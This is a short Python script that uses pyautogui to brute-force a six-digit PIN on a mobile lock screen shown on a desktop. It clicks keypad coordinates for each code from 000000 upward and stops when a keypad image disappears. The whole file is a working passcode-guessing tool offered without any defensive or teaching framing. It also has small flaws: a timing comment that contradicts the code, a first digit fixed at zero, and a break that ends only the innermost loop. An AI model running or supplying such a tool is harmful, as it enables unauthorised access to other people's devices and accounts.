import time

import pyautogui

# pyautogui.PAUSE = 0.1
positions = {
    "0": (958, 968),
    "1": (816, 795),
    "2": (961, 795),
    "3": (1104, 792),
    "4": (814, 851),
    "5": (959, 850),
    "6": (1106, 852),
    "7": (812, 910),
    "8": (959, 910),
    "9": (1105, 910),
}


# The alert to go to the mobline interface.
the_alert = pyautogui.alert("Start Bruteforce", "Access")

# Time to make the moblie interface the active interface.
time.sleep(10)

# The loop to generate numbers.
for first in range(1):
    for second in range(10):
        for third in range(10):
            for fourth in range(10):
                for fifth in range(10):
                    for sixth in range(10):
                        number = f"{first}{second}{third}{fourth}{fifth}{sixth}"
                        print(number)

                        # Excecute the clicks
                        pyautogui.click(positions[f"{first}"])
                        pyautogui.click(positions[f"{second}"])
                        pyautogui.click(positions[f"{third}"])
                        pyautogui.click(positions[f"{fourth}"])
                        pyautogui.click(positions[f"{fifth}"])
                        pyautogui.click(positions[f"{sixth}"])

                        # Two seconds to check if it's correct.
                        time.sleep(0.4)
                        if not pyautogui.locateOnScreen("keys.png"):
                            print(number)
                            time.sleep(3)
                            break
